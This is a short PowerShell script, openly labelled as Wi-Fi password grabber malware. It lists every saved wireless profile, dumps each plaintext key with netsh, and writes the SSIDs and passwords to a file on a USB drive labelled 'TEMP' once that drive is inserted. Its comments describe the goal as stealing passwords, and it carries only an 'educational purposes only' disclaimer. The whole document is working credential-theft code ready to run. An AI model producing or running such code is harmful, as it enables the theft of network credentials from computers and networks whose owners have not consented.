#WIFI PASSWORD GRABBER MALWARE
#by Cayden Wright
#Jan 1, 2023 (happy new year!)

#this malware will find all known wifi passwords and store them on a USB drive with a given name.
#the script will wait a specified amount of seconds for the USB drive to be inserted before terminating.

#educational purposes only

#timeout in seconds
$timeout=30

#desired USB stick name
$DesiredName="TEMP"




#returns an object if USB is found, otherwise returns false
function TestForUSB($DriveName){
    #kinda dirty using try/catch but whatever
    try{Get-Volume -FriendlyName $DriveName -ErrorAction Stop}
    catch{return $false}
}

#writes passwords to a given path
function WritePasswords($FilePath){
    #first get all the profiles
    $profiles = netsh wlan show profile
    foreach ($current_profile in $profiles | Select-Object -skip 2){
        #skip header rows
        if ($current_profile.IndexOf(":") -eq -1){
            continue
        }
    #get name so we can find the password
    $current_profile = $current_profile.ToString()
    $name=$current_profile.Substring($current_profile.IndexOf(":")+2)
    $name=$name.Trim()
    #get the password, with some other garbage
    #there surely is a better way to do this - I am horrible at powershell
    $raw = netsh wlan show profile name=$name key=clear | Select-String -Pattern "Key Content"
    #case if there is no password
    try{
        $raw = $raw.ToString()
        $pw = $raw.Substring($raw.IndexOf(":")+2)
    }
    catch{$pw = ""}
    #write to file
    Write-Output ('SSID: '+$name+"`n"+'PASSWORD: '+$pw+"`n") | Out-File -FilePath $FilePath -Append
    }
}

#wait for USB stick to be inserted
$FailCount=0
while ((TestForUSB($DesiredName)) -eq $false){
    $FailCount=$FailCount+1
    if ($FailCount -eq $timeout){exit}
    Start-Sleep -Seconds 1
}
#get drive letter, generate filename and full path of file
$driveLetter = (Get-Volume -FileSystemLabel $DesiredName).DriveLetter
$filename= Get-Date -Format "MM_dd_yyyy-HH_mm"
$filename=$env:computername+'-'+$filename
$path=($driveLetter+':\'+$filename+'.txt')

#and go steal dem passwords
WritePasswords $path